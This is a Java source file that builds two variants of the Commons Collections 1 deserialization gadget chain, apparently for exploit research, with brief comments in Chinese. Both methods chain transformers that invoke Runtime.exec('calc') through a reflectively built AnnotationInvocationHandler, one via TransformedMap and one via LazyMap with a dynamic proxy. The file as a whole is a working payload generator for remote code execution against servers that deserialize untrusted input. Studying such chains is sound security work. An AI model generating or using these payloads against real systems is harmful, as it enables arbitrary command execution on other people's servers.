package com.yyjccc.CommonsExp;

import com.yyjccc.Utils.Tool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Cc1 {


    public static Object cc1_1() throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","hu");
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);

        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorateMap);
        return o;

    }
    public static Object cc1_2() throws Exception {
        Transformer[] transformer=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformer);
        HashMap<Object,Object> hashMap=new HashMap<>();
        hashMap.put("value","test");
        Map<Object,Object> map = LazyMap.decorate(hashMap, chainedTransformer);
        //反射实例化AnnotationInvocationHandler
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        //生成处理器，AnnotationInvocationHandler实现的就是InvocationHandler接口
        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,map);
        //生成动态代理map,第二个参数为要代理的接口类
        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);

        //再次实例对象，放入代理对象
        //可以进行强转
        InvocationHandler o = (InvocationHandler) constructor.newInstance(Target.class, proxymap);

        return o;
    }
}
